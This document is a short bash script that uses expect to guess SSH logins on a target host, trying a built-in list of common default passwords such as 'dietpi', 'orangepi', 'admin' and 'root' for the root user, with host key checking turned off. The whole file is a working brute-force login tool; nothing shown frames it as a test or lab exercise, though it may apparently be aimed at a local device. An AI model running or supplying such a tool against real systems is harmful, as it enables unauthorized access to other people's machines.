#!/bin/bash
# Try SSH with expect (handles keyboard-interactive auth that sshpass can't)
# Run on 138
TARGET=$1
USER=${2:-root}
for PASS in dietpi 1234 admin ari orangepi 191122960 rock 123456 password root; do
  echo -n "  $USER/$PASS: "
  expect -c "
    set timeout 3
    spawn ssh -o StrictHostKeyChecking=no $USER@$TARGET hostname
    expect {
      \"*assword*\" { send \"$PASS\r\"; expect { \"*#*\" { puts \"LOGIN_OK\" } \"*denied*\" { puts \"DENIED\" } timeout { puts \"TIMEOUT\" } } }
      \"*denied*\" { puts \"DENIED\" }
      timeout { puts \"TIMEOUT\" }
      eof { puts \"EOF\" }
    }
  " 2>/dev/null | grep -E "LOGIN_OK|DENIED|TIMEOUT|EOF" | tail -1
  sleep 1
done
